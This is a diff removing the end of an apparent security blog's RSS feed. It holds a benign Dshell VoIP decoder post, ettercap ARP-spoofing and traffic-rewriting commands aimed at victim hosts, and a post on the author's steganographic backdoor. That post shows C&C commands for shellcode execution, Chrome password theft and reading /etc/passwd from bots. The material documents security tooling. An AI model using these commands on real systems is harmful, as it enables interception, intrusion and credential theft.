-         |                       ACK F12                    |
-         |-------------------------------------------------&amp;gt;|
-         |                   Media Session                  |
-         |&amp;lt;================================================&amp;gt;|
-         |                       BYE F13                    |
-         |&amp;lt;-------------------------------------------------|
-         |                     200 OK F14                   |
-         |-------------------------------------------------&amp;gt;|
-         |                                                  |
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The Session Initiation Protocol (SIP) decoder will extract the Call ID, User agent, Codec, Method, SIP call, Host, and Client MAC address from every SIP request or response packet found in the given pcap. For example:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d sip &amp;lt;pcap&amp;gt; 
-
-&amp;lt;-- SIP Request --&amp;gt; 
-Timestamp: 2016-09-21 22:44:28.220185 UTC - Protocol: UDP - Size: 435 bytes
-Sequence and Method: 1 ACK
-From: 10.5.1.8:5060 (00:20:80:a1:13:db) to 10.5.1.7:5060 (15:2a:01:b4:0f:47)
-Via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK940bdac4-8a13-1410-9e58-08002772a6e9;rport
-SIP call: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9  --&amp;gt;  &quot;miguel&quot; &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;;tag=84538c9d-ba7e-e611-937f-68a3c4f0d6ce
-Call ID: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC
-
---&amp;gt; SIP Response &amp;lt;-- 
-Timestamp: 2016-09-21 22:44:27.849761 UTC - Protocol: UDP - Size: 919 bytes
-Sequence and Method: 1 INVITE
-From: 10.5.1.7:5060 (02:0a:40:12:30:23) to 10.5.1.8:5060 (d5:02:03:94:31:1b)
-Via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK26a8d5c4-8a13-1910-9d58-08002772a6e9;rport=5060;received=10.5.1.8
-SIP call: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9  --&amp;gt;  &quot;miguel&quot; &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;;tag=84538c9d-ba7e-e611-937f-68a3c4f0d6ce
-Call ID: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC
-Codec selected: PCMU 
-Rate selected: 8000 
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;To obtain and show a detailed output we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;--sip_showpkt&lt;/code&gt; option:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d sip --sip_showpkt &amp;lt;pcap&amp;gt; 
-
---&amp;gt; SIP Response &amp;lt;-- 
-Timestamp: 2016-09-21 22:44:25.360974 UTC - Protocol: UDP - Size: 349 bytes
-From: 10.5.1.7:5060 (15:2a:01:b4:0f:47) to 10.5.1.8:5060 (00:20:80:a1:13:db) 
-SIP/2.0 100 Trying
-content-length: 0
-via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK26a8d5c4-8a13-1910-9d58-08002772a6e9;rport=5060;received=10.5.1.8
-from: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9
-to: &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;
-cseq: 1 INVITE
-call-id: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC
-
---&amp;gt; SIP Response &amp;lt;-- 
-Timestamp: 2016-09-21 22:44:25.387780 UTC - Protocol: UDP - Size: 585 bytes
-From: 10.5.1.7:5060 (15:2a:01:b4:0f:47) to 10.5.1.8:5060 (00:20:80:a1:13:db)
-SIP/2.0 180 Ringing
-content-length: 0
-via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK26a8d5c4-8a13-1910-9d58-08002772a6e9;rport=5060;received=10.5.1.8
-from: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9
-require: 100rel
-rseq: 694867676
-user-agent: Ekiga/4.0.1
-to: &quot;miguel&quot; &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;;tag=84538c9d-ba7e-e611-937f-68a3c4f0d6ce
-contact: &quot;miguel&quot; &amp;lt;sip:miguel@10.5.1.7&amp;gt;
-cseq: 1 INVITE
-allow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING,PRACK
-call-id: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;If your packets Ethernet is being replaced by Linux Cooked Capture we can use the next options:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d sip --no-vlan --layer2=sll.SLL &amp;lt;pcap&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;And to obtain statistics about your SIP packets we can use tshark:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tshark -q -r &amp;lt;pcap&amp;gt; -Y sip -z sip,stat
-
-===================================================================
-SIP Statistics
-
-Number of SIP messages: 28
-Number of resent SIP messages: 8
-
-* SIP Status Codes in reply packets
-  SIP 180 Ringing         :     1 Packets
-  SIP 200 OK              :     5 Packets
-  SIP 100 Trying          :     1 Packets
-
-* List of SIP Request methods
-  INVITE          :     4 Packets
-  PRACK           :     1 Packets
-  INFO            :     2 Packets
-  ACK             :     1 Packets
-  PUBLISH         :    10 Packets
-  CANCEL          :     2 Packets
-  BYE             :     1 Packets
-
-* Average setup time 2447 ms
- Min 2447 ms
- Max 2447 ms
-===================================================================
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;rtp-decoder&quot;&gt;RTP decoder&lt;/h3&gt;
-
-&lt;p&gt;RTP &lt;a href=&quot;https://www.ietf.org/rfc/rfc3550.txt&quot;&gt;RFC 3550&lt;/a&gt; provides end-to-end network transport functions suitable for applications transmitting real-time data, such as audio, video or simulation data, over multicast or unicast network services.&lt;/p&gt;
-
-&lt;p&gt;The RTP Payload is defined in the next RFCs and links:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc2198&quot;&gt;RFC 2198&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc4855&quot;&gt;RFC 4855&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.iana.org/assignments/rtp-parameters/rtp-parameters.xhtml&quot;&gt;RTP Parameters&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The real-time transport protocol (RTP) decoder will extract the Hosts, Payload Type, Synchronization source, 
-Sequence Number, Padding, Marker and Client MAC address from every RTP packet found in the given pcap. For example:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d rtp &amp;lt;pcap&amp;gt; 
-
-    rtp 2002-07-26 07:19:10        10.1.6.18:2006  --       10.1.3.143:5000  ** 
-        From: 10.1.6.18 (00:08:21:91:64:60) to 10.1.3.143 (00:04:76:22:20:17) 
-        Payload Type (7 bits): PCMA - Audio - 8000 Hz - 1 Channel
-        Sequence Number (16 bits): 9825
-        Timestamp (32 bits): 54240 
-        Synchronization source (32 bits): 4090175489
-        Arrival Time: 1027664350.17
-        Contributing source (32 bits): 0, Padding (1 bit): 0, Extension (1 bit): 0, Marker (1 bit): 0
-    **
-    rtp 2002-07-26 07:19:10       10.1.3.143:5000  --        10.1.6.18:2006  ** 
-        From: 10.1.3.143 (00:04:76:22:20:17) to 10.1.6.18 (00:d0:50:10:01:66) 
-        Payload Type (7 bits): PCMA - Audio - 8000 Hz - 1 Channel
-        Sequence Number (16 bits): 59364
-        Timestamp (32 bits): 55680 
-        Synchronization source (32 bits): 3739283087
-        Arrival Time: 1027664350.2
-        Contributing source (32 bits): 0, Padding (1 bit): 0, Extension (1 bit): 0, Marker (1 bit): 0
-    **
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Some data, to compare, obtained with tshark:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tshark -q -r &amp;lt;pcap&amp;gt; -Y rtp -z rtp,streams
-========================= RTP Streams ========================
-Src IP addr  Port    Dest IP addr  Port       SSRC          Payload  Pkts         Lost   Max Delta(ms)  Max Jitter(ms) Mean Jitter(ms) Problems?
- 10.1.3.143  5000       10.1.6.18  2006 0xDEE0EE8F ITU-T G.711 PCMA   236     0 (0.0%)           34.83            0.83            0.37 
- 10.1.6.18  2006      10.1.3.143  5000 0xF3CB2001 ITU-T G.711 PCMA   229     1 (0.4%)           86.12            7.34            2.84 X
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Mon, 17 Oct 2016 00:00:00 +0100</pubDate>
-        <link>/Dshell_VoIP_decoders.html</link>
-        <guid isPermaLink="true">/Dshell_VoIP_decoders.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>MITM with ettercap</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://ettercap.github.io/ettercap/&quot;&gt;Ettercap&lt;/a&gt; is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.&lt;/p&gt;
-
-&lt;h3 id=&quot;basic-sniffing&quot;&gt;Basic Sniffing&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -Tzq -i eth0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;To sniff traffic between 2 hosts:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -i eth0 -Tq -M ARP:remote /victim_ip_A/ /victim_ip_B/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Capture traffic on a certain port only:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -i eth0 -T -M arp /192.168.1.1 / /192.168.1.10-20/23
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;mitm&quot;&gt;MITM&lt;/h3&gt;
-
-&lt;p&gt;Filter example:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (tcp.dst == 1234 &amp;amp;&amp;amp; search(DECODED.data,&quot;2016-10-03&quot;)){
-        msg(&quot;Match date...\n&quot;);
-        replace(&quot;2016-10-03&quot;,&quot;2017-10-03&quot;);
-        replace(&quot;118.186.71.134&quot;,&quot;111.222.33.444&quot;);
-        replace(&quot;PASw0rD&quot;,&quot;NOPassw&quot;);
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Compile the filter:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# etterfilter -o POC.ef POC.filter
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Launch ettercap:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -T -q -i eth0 -F POC.ef -M ARP
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Wed, 21 Sep 2016 00:00:00 +0100</pubDate>
-        <link>/Ettercap.html</link>
-        <guid isPermaLink="true">/Ettercap.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Stegator</title>
-        <description>&lt;p&gt;Some months ago I discover &lt;a href=&quot;https://github.com/byt3bl33d3r/gcat&quot;&gt;Gcat&lt;/a&gt; and &lt;a href=&quot;https://github.com/PaulSec/twittor&quot;&gt;Twittor&lt;/a&gt; which inspired me to write a similar C&amp;amp;C backdoor service using steganography, not only to protect the messages encrypting the source, but also to protect and hide the messages or activity into images.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/1modm/stegator&quot;&gt;&lt;strong&gt;Stegator&lt;/strong&gt;&lt;/a&gt; is a Python based backdoor that uses Steganography and a Cloud Image Service as a command and control server.&lt;/p&gt;
-
-&lt;p&gt;The C&amp;amp;C service insert into the images the commands using a password and the utility steghide, then the images are uploaded into the Cloud Image Service with an specific uuid used by the agent (implant) service to retrieve the image, extract the command and execute in the infected host. Once the results are obtained then are uploaded into the Cloud Image Service to be available for the C&amp;amp;C server to get the results.&lt;/p&gt;
-
-&lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Z5lqbfl.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;
-
-&lt;p&gt;The C&amp;amp;C server offers an ‘interactive’ shell which offers few commands that are:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; help
-
-
- cleanup - Clean Cloud Service images
- refresh - Refresh C&amp;amp;C control and ping all bots
- bots - List active bots
- commands - List executed commands
- retrieve &amp;lt;jobid&amp;gt; - Retrieve jobid command
- cmd &amp;lt;MAC ADDRESS&amp;gt; command - Execute the command on the bot
- shellcode &amp;lt;MAC ADDRESS&amp;gt; shellcode - Load and execute shellcode in memory (Windows only)
- scanner &amp;lt;MAC ADDRESS&amp;gt; &amp;lt;IP&amp;gt;:&amp;lt;PORT&amp;gt; - Port scanner example: scanner 0:0:0:0 192.168.1.1:22,80,443
- chromepasswords &amp;lt;MAC ADDRESS&amp;gt; - Retrieve Chrome Passwords from bot (Windows only)
- help - Print this usage
- exit - Exit the client
-
-
-C&amp;amp;C console &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Once you’ve deployed the backdoor on a couple of systems, you can check available clients using the bots command:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; bots
-Bot: 04:D6:27:72:A3:E9 Windows-7-6.1.7601-SP1
-Bot: 68:A3:C4:F0:98:CE Linux-4.4.0-23-generic-x86_64-with-Ubuntu-16.04-xenial
-Bot: 04:00:72:3F:D6:98 Linux-3.16.0-4-amd64-x86_64-with-debian-8.2
-C&amp;amp;C console &amp;gt; 
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The output is the MAC address which is used to uniquely identifies the system but also gives you OS information the implant is running on.&lt;/p&gt;
-
-&lt;p&gt;Let’s issue a command to an implant:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; cmd 04:00:72:3F:D6:98 cat /etc/passwd  
-[+] Downloading image from Cloud Service...
-[+] Uploaded image to Cloud Service
-[+] Steganography applied, image saved
-[+] Sent command cat /etc/passwd with jobid: 631f4ee7328244b8b462876e1f8dd753
-C&amp;amp;C console &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Lets get the results!&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; retrieve 631f4ee7328244b8b462876e1f8dd753
-631f4ee7328244b8b462876e1f8dd753: 
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
-Debian-exim:x:104:109::/var/spool/exim4:/bin/false
-messagebus:x:105:110::/var/run/dbus:/bin/false
-statd:x:106:65534::/var/lib/nfs:/bin/false
-avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
-sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
-mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
-postfix:x:110:117::/var/spool/postfix:/bin/false
-dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
-dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
-haproxy:x:113:121::/var/lib/haproxy:/bin/false
-proftpd:x:114:65534::/run/proftpd:/bin/false
-ftp:x:115:65534::/srv/ftp:/bin/false
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Retrieve previous commands&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; commands
-631f4ee7328244b8b462876e1f8dd753: 'cat /etc/passwd' on 04:00:72:3F:D6:98
-97ee81e0647a4f248ac47c68e8b25b88: 'ipconfig' on 04:D6:27:72:A3:E9
-C&amp;amp;C console &amp;gt; 
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;cast&quot;&gt;Cast&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw?autoplay=1&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw.png&quot; alt=&quot;cast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
-</description>
-        <pubDate>Sat, 16 Jul 2016 00:00:00 +0100</pubDate>
-        <link>/stegator.html</link>
-        <guid isPermaLink="true">/stegator.html</guid>
-        
-        
-      </item>
-    
-  </channel>
-</rss>
+  </body>
+</html>
